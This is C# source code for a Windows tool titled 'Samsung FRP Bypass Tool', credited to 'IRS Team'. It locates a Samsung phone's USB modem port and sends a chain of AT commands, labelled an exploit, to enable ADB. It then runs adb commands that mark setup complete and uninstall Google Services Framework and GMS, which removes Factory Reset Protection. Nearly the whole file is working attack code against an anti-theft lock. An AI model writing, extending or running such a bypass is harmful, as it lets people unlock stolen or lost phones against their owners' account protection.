using System;
using System.Drawing;
using System.IO.Ports;
using System.Management; // Reference Required: System.Management
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace SamsungFRPTool
{
    // --- ENTRY POINT ---
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }

    // --- MAIN INTERFACE & LOGIC ---
    public class MainForm : Form
    {
        // UI Components
        private Button btnEnableAdb;
        private RichTextBox txtLog;
        private Label lblTitle;
        private Label lblCredits;
        private Label lblContact;
        private ProgressBar progressBar;
        private Label lblStatus;

        public MainForm()
        {
            InitializeUI();
        }

        private void InitializeUI()
        {
            // 1. Form Setup
            this.Text = "Samsung FRP Tool - Android 16 (IRS Team)";
            this.Size = new Size(520, 500);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.FromArgb(30, 30, 35); // Modern Dark Theme
            this.Icon = SystemIcons.Shield; 

            // 2. Title Header
            lblTitle = new Label();
            lblTitle.Text = "Samsung FRP Bypass Tool";
            lblTitle.Font = new Font("Segoe UI", 18, FontStyle.Bold);
            lblTitle.ForeColor = Color.White;
            lblTitle.AutoSize = true;
            lblTitle.Location = new Point(20, 20);
            this.Controls.Add(lblTitle);

            // 3. Credits
            lblCredits = new Label();
            lblCredits.Text = "Android 15/16 | Dev: IRS Team";
            lblCredits.Font = new Font("Segoe UI", 10, FontStyle.Regular);
            lblCredits.ForeColor = Color.Cyan;
            lblCredits.AutoSize = true;
            lblCredits.Location = new Point(24, 60);
            this.Controls.Add(lblCredits);

            // 4. Contact Info
            lblContact = new Label();
            lblContact.Text = "Support: +15129532720";
            lblContact.Font = new Font("Segoe UI", 9, FontStyle.Italic);
            lblContact.ForeColor = Color.LightGray;
            lblContact.AutoSize = true;
            lblContact.Location = new Point(24, 80);
            this.Controls.Add(lblContact);

            // 5. Log Console
            txtLog = new RichTextBox();
            txtLog.Location = new Point(20, 120);
            txtLog.Size = new Size(460, 230);
            txtLog.BackColor = Color.Black;
            txtLog.ForeColor = Color.LimeGreen;
            txtLog.Font = new Font("Consolas", 9);
            txtLog.ReadOnly = true;
            txtLog.BorderStyle = BorderStyle.None;
            txtLog.Text = "waiting for device...\n";
            this.Controls.Add(txtLog);

            // 6. Progress Bar
            progressBar = new ProgressBar();
            progressBar.Location = new Point(20, 360);
            progressBar.Size = new Size(460, 10);
            progressBar.Style = ProgressBarStyle.Marquee;
            progressBar.Visible = false;
            this.Controls.Add(progressBar);

            // 7. Action Button
            btnEnableAdb = new Button();
            btnEnableAdb.Text = "ENABLE ADB && UNLOCK";
            btnEnableAdb.Font = new Font("Segoe UI", 12, FontStyle.Bold);
            btnEnableAdb.BackColor = Color.FromArgb(0, 120, 215);
            btnEnableAdb.ForeColor = Color.White;
            btnEnableAdb.FlatStyle = FlatStyle.Flat;
            btnEnableAdb.FlatAppearance.BorderSize = 0;
            btnEnableAdb.Location = new Point(20, 380);
            btnEnableAdb.Size = new Size(460, 50);
            btnEnableAdb.Cursor = Cursors.Hand;
            btnEnableAdb.Click += BtnEnableAdb_Click;
            this.Controls.Add(btnEnableAdb);

            // 8. Footer Status
            lblStatus = new Label();
            lblStatus.Text = "Ready.";
            lblStatus.ForeColor = Color.Gray;
            lblStatus.Location = new Point(20, 440);
            lblStatus.AutoSize = true;
            this.Controls.Add(lblStatus);
        }

        // --- EVENTS ---

        private async void BtnEnableAdb_Click(object sender, EventArgs e)
        {
            if (btnEnableAdb.Text.Contains("Running")) return;

            btnEnableAdb.Enabled = false;
            btnEnableAdb.Text = "Running Exploit...";
            btnEnableAdb.BackColor = Color.DimGray;
            progressBar.Visible = true;
            txtLog.Clear();

            Log("Initializing IRS Team Tool...");
            Log("Checking for Samsung Modem...");

            // Execute the heavy lifting in a background thread
            bool exploitSuccess = await Task.Run(() => RunSamsungExploit());

            if (exploitSuccess)
            {
                Log("\n[*] Exploit Sent. Waiting for ADB Authorization...");
                Log("[!] PLEASE CHECK PHONE SCREEN AND PRESS 'ALLOW'!");
                
                // Wait for user to tap screen
                await Task.Delay(5000); 

                // Run ADB Removal
                await Task.Run(() => RemoveFRP_ViaADB());
            }

            // Reset UI
            progressBar.Visible = false;
            btnEnableAdb.Enabled = true;
            btnEnableAdb.Text = "ENABLE ADB && UNLOCK";
            btnEnableAdb.BackColor = Color.FromArgb(0, 120, 215);
            Log("\n[?] Process Finished.");
        }

        // --- BACKEND LOGIC: EXPLOIT ---

        private bool RunSamsungExploit()
        {
            string portName = FindSamsungModemPort();

            if (string.IsNullOrEmpty(portName))
            {
                Log("[!] ERROR: Samsung Modem Port not found.");
                Log("    Make sure device is in *#0*# mode.");
                Log("    Check Device Manager for 'Samsung Mobile USB Modem'.");
                return false;
            }

            Log($"[*] Found Target: {portName}");
            
            // The magic packet sequence
            string[] commands = new string[]
            {
                "AT\r\n",               
                "AT+KSTRINGB=0,3\r\n",   
                "AT+DUMPCTRL=1,0\r\n",   
                "AT+DEBUGLVL=0,4\r\n",   
                "AT+SWATD=0\r\n",        
                "AT+ACTIVATE=0,0,0\r\n", 
                "AT+SWATD=1\r\n"         
            };

            try
            {
                using (SerialPort serial = new SerialPort(portName, 115200))
                {
                    serial.DtrEnable = true;
                    serial.RtsEnable = true;
                    serial.ReadTimeout = 500;
                    serial.WriteTimeout = 500;
                    serial.Open();

                    // Handshake
                    serial.Write("AT\r\n");
                    Thread.Sleep(200);
                    
                    // Send Chain
                    foreach (string cmd in commands)
                    {
                        serial.Write(cmd);
                        Thread.Sleep(300); // Crucial delay
                        try {
                            string r = serial.ReadExisting(); 
                            // Only log relevant responses to keep UI clean
                            if(r.Contains("OK") || r.Contains("error")) { /* optional log */ }
                        } catch {}
                    }
                }
                Log("[*] Exploit Packets Delivered.");
                return true;
            }
            catch (Exception ex)
            {
                Log($"[!] Connection Error: {ex.Message}");
                return false;
            }
        }

        // --- BACKEND LOGIC: PORT DETECTION ---

        private string FindSamsungModemPort()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_PnPEntity WHERE Caption LIKE '%Samsung%' AND Caption LIKE '%Modem%'"
                );

                foreach (ManagementObject item in searcher.Get())
                {
                    string name = item["Caption"].ToString();
                    // Parse "Samsung Mobile USB Modem (COM15)" -> "COM15"
                    if (name.Contains("(COM"))
                    {
                        int start = name.LastIndexOf("(COM") + 1;
                        int end = name.LastIndexOf(")");
                        return name.Substring(start, end - start);
                    }
                }
            }
            catch { Log("[!] WMI Error. Is 'System.Management' referenced?"); }
            return null;
        }

        // --- BACKEND LOGIC: ADB REMOVAL ---

        private void RemoveFRP_ViaADB()
        {
            Log("[*] Checking ADB connection...");
            
            string devices = RunAdb("devices");
            if (!devices.Contains("\tdevice"))
            {
                Log("[!] Device not authorized or not connected via ADB.");
                Log("    (Did you click 'Allow' on the popup?)");
                return;
            }

            Log("[*] Device Authorized! Removing Lock...");

            // 1. Set User Setup Complete
            RunAdb("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1");
            
            // 2. Remove Google Account Manager (GSF)
            RunAdb("shell pm uninstall -k --user 0 com.google.android.gsf");
            RunAdb("shell pm uninstall -k --user 0 com.google.android.gms"); // Optional: GMS

            // 3. Open Settings
            RunAdb("shell am start -n com.android.settings/com.android.settings.Settings");

            Log("------------------------------------------");
            Log("       FRP BYPASS SUCCESSFUL");
            Log("       Reset device from Settings now.");
            Log("------------------------------------------");
            
            MessageBox.Show("FRP Removed! Please factory reset the device from settings now.", "IRS Team", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private string RunAdb(string args)
        {
            if (!File.Exists("adb.exe"))
            {
                Log("[!] ERROR: adb.exe missing from tool folder!");
                return "";
            }

            try
            {
                Process p = new Process();
                p.StartInfo.FileName = "adb.exe";
                p.StartInfo.Arguments = args;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return outStr;
            }
            catch (Exception ex)
            {
                Log($"[!] ADB Error: {ex.Message}");
                return "";
            }
        }

        // --- UTILS ---

        private void Log(string msg)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(Log), msg);
                return;
            }
            txtLog.AppendText(msg + Environment.NewLine);
            txtLog.SelectionStart = txtLog.Text.Length;
            txtLog.ScrollToCaret();
        }
    }
}
